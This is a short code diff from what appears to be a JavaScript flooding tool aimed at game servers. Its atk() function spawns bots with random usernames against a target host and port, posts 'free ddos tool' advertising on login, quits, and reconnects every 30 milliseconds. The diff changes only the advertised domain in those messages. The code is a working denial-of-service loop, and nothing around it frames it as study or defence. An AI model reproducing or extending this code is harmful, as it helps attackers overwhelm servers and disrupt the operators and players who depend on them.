@@ -39,9 +39,9 @@ function atk(){
     port: targetport,
     username: makeid(10)
   });
-  bot.on('kicked', function(){bot.quit("attack by anondiscord.ml! free tool!");});
-  bot.on('error', function(){bot.quit("attack by anondiscord.ml! free tool!");});
-  bot.on('login', function(){bot.send("attack by anondiscord.ml! free ddos tool!");bot.quit("attack by anondiscord.ml! free tool!");});
+  bot.on('kicked', function(){bot.quit("attack by anonattack.cf! free tool!");});
+  bot.on('error', function(){bot.quit("attack by anonattack.cf! free tool!");});
+  bot.on('login', function(){bot.send("attack by anonattack.cf! free ddos tool!");bot.quit("attack by anonattack.cf! free tool!");});
   setTimeout(function (){
     atk(target);
   },30);
